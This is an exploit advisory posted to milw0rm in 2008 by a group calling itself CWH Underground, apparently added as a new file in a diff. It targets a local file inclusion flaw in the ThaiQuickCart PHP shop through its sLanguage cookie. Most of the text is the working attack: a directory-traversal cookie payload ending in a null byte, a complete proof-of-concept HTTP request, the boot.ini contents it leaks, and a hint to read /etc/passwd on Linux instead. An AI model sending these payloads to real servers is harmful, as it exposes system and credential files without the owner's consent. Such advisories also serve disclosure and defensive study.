@@ -1,0 +1,59 @@
+=====================================================================
+ ThaiQuickCart (COOKIE:sLanguage) Local File Inclusion Vulnerability
+=====================================================================
+
+  ,--^----------,--------,-----,-------^--,
+  | |||||||||   `--------'     |          O	.. CWH Underground Hacking Team ..
+  `+---------------------------^----------|
+    `\_,-------, _________________________|
+      / XXXXXX /`|     /
+     / XXXXXX /  `\   /
+    / XXXXXX /\______(
+   / XXXXXX /           
+  / XXXXXX /
+ (________(             
+  `------'
+
+
+AUTHOR : CWH Underground
+DATE : 17 June 2008
+SITE : www.citec.us
+
+
+#####################################################
+ APPLICATION : ThaiQuickCart 
+ DOWNLOAD    : http://www.somsak2004.net/Files/cubecart.zip
+#####################################################
+
+---LFI---
+
+-------------
+ Exploit
+-------------
+
+[+] Cookie: PHPSESSID=c480489c031b3b0fb7ad1a2c8768a9ca;sOrderQC_th=c81e728d9d4c2f636f067f89cc14862c;sLanguage=[LFI]
+
+-------------
+ POC Exploit
+-------------
+
+[+] GET http://192.168.24.25/thaiquickcart/qc/index.php HTTP/1.0
+[+] Accept: */*
+[+] User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.1.4322)
+[+] Host: 192.168.24.25
+[+] Cookie: PHPSESSID=c480489c031b3b0fb7ad1a2c8768a9ca;sOrderQC_th=c81e728d9d4c2f636f067f89cc14862c;sLanguage=../../../../../../../../boot.ini%00
+
+    This exploit will open boot.ini in system file:
+
+[boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect [boot loader] timeout=30 default=multi(0)disk(0)rdisk(0)partition(1)
+\WINDOWS [operating systems] multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /noexecute=optin /fastdetect
+
+    You can change boot.ini to /etc/passwd%00 in linux OS.
+
+
+##################################################################
+# Greetz: ZeQ3uL, BAD $ectors, Snapter, Conan, JabAv0C, Win7dos  #
+##################################################################
+
+# milw0rm.com [2008-06-17]
